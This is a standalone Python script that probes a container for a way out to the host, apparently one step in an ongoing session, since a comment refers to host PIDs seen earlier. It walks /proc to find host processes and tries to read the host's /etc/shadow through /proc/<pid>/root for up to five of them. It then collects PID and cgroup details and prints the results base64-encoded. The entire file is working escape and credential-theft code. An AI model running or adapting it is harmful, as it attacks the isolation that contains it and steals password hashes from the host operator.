import os,base64
out=[]

# Try /proc/1/root path traversal
# In a non-namespace container (PID namespace only), /proc/1/root = container root
# But /proc/<host_pid>/root = host root
# We saw host PIDs visible: 690540+

# Find host PID range
host_pids = []
for p in os.listdir('/proc'):
    try:
        pid = int(p)
        if pid > 1000:  # likely host PIDs
            # Check if this PID has different root
            try:
                root = os.readlink(f'/proc/{pid}/root')
                if root != '/':
                    out.append(f"PID:{pid}:root={root}")
                    host_pids.append(pid)
                # Check cgroup
                cg = open(f'/proc/{pid}/cgroup').read().strip()
                if 'docker' not in cg and 'containerd' not in cg and cg != '0::/':
                    out.append(f"HOST_PID:{pid}:cg={cg[:80]}")
            except:
                pass
    except:
        pass

# Try reading /proc/<host_pid>/root/etc/shadow
for pid in host_pids[:5]:
    try:
        shadow = open(f'/proc/{pid}/root/etc/shadow').read()[:200]
        out.append(f"SHADOW_VIA_{pid}:{shadow}")
    except Exception as e:
        out.append(f"SHADOW_VIA_{pid}:ERR:{str(e)[:50]}")

# Count total visible PIDs
all_pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
out.append(f"TOTAL_PIDS:{len(all_pids)}")
out.append(f"MAX_PID:{max(all_pids)}")
out.append(f"MIN_PID:{min(all_pids)}")

# PID 1 cgroup (container vs host)
try:
    out.append(f"PID1_CG:{open('/proc/1/cgroup').read().strip()}")
except:
    pass

print(base64.b64encode("\n".join(out).encode()).decode())
